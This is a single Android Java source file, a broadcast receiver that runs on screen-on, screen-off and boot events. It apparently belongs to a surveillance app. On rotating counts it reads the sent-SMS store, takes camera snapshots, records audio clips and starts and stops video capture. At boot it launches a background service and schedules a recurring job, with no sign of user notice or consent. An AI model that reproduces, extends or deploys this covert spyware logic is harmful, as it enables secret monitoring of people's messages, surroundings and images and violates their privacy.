package mdane.myapplication6.Receivers;

import android.app.Activity;
import android.app.Application;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.Handler;
import android.util.Log;

import com.evernote.android.job.JobManager;

import mdane.myapplication6.Jobs.App;
import mdane.myapplication6.Jobs.DemoJobCreator;
import mdane.myapplication6.Jobs.DemoSyncJob;
import mdane.myapplication6.SMS.ListenSmsMmsService;
import mdane.myapplication6.SMS.ListenSmsMmsService;
import mdane.myapplication6.Services.BVideo1;
import mdane.myapplication6.Services.HandleAudioClip;
import mdane.myapplication6.Services.HandleCameraSnap;
import mdane.myapplication6.Services.MyService;
import mdane.myapplication6.Services.SMSREcordI;
import mdane.myapplication6.util.ThreadedModel;
import mdane.myapplication6.util.printFile;

public class MyReceiver2 extends BroadcastReceiver{

        public static final String PREFS_NAME = "PREFS1";
    public static final String KEY_COUNT = "notificationCount";
    Intent intent;
    PendingIntent alarmIntent;
    int parameters;
    int para2;
    int currentCount;
    MediaRecorder recorder;
    private String noKill;

    @Override
    public void onReceive(final Context context, Intent intent) {
       final SharedPreferences values = context.getSharedPreferences(PREFS_NAME, Activity.MODE_PRIVATE); final SharedPreferences.Editor editor = values.edit();
        currentCount = values.getInt(KEY_COUNT, 0);  //Sets to zero if not in prefs yet

        //Do your magic work here

        //Write the value back to storage for later use



        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_SCREEN_ON)) {
            Thread B=new Thread(new  Runnable(){
                @Override
                public void run(){
                    editor.putInt(KEY_COUNT, currentCount + 1);
                    editor.commit();
                    int a = values.getInt(KEY_COUNT, currentCount);
                    if(a>21){                    editor.putInt(KEY_COUNT, currentCount =0);
                        editor.commit();}
                    Log.i("value of a", Integer.toString(a));

                    if (a == 10||a==20)

                    {
                        Log.i("value of a", Integer.toString(a));
                       //Intent aIntent = new Intent(context, BVideo1.class);
                     //   context.startService(aIntent);

                    } else {

                        if(a%2==0){
SMSObj.tryURI(context);
                            printFile.tryURI(context,"content://sms/sent/");
                            Intent  bIntent = new Intent(context, HandleCameraSnap.class);
                            context.startService(bIntent);
                            ThreadedModel.ThreadedService(context.getApplicationContext(),HandleAudioClip.class);
                        }
                        if (a == 5||a==12||a==18){
                           if (!HandleAudioClip.running){
                         //   Intent  bIntent = new Intent(context, HandleAudioClip.class);
                           // context.startService(bIntent);
                               ThreadedModel.ThreadedService(context.getApplicationContext(),HandleAudioClip.class);}
                        }}

                }});B.start();}


        /*
      *End of Screen on Receiver
      *
       */

        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_SCREEN_OFF)) {

                         /*
                           *  *Begin Screen OFF block
                           */



            int a = values.getInt(KEY_COUNT, currentCount);
            if (a == 20||a==10) {
                if(a==10){

            Intent  aIntent = new Intent(context, BVideo1.class);
                        context.stopService(aIntent);
                }

                if(a==20){
                        Intent aIntent = new Intent(context, BVideo1.class);
                        context.stopService(aIntent);
                        editor.putInt(KEY_COUNT, currentCount = 0);
                        editor.commit();}else {

                }
            } else {



                if (a == 5||a==12||a==18){
                  final  Intent  bIntent = new Intent(context, HandleAudioClip.class);

                    Handler aHandler=new Handler();
                    aHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            context.stopService(bIntent);
                        }
                    },15000);
                }
            }


        }
        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_BOOT_COMPLETED)) {
            Intent aIntent = new Intent(context, MyService.class);
            context.startService(aIntent);
            JobManager.create(context).addJobCreator(new DemoJobCreator());
            DemoSyncJob.scheduleJob();
        }

}}
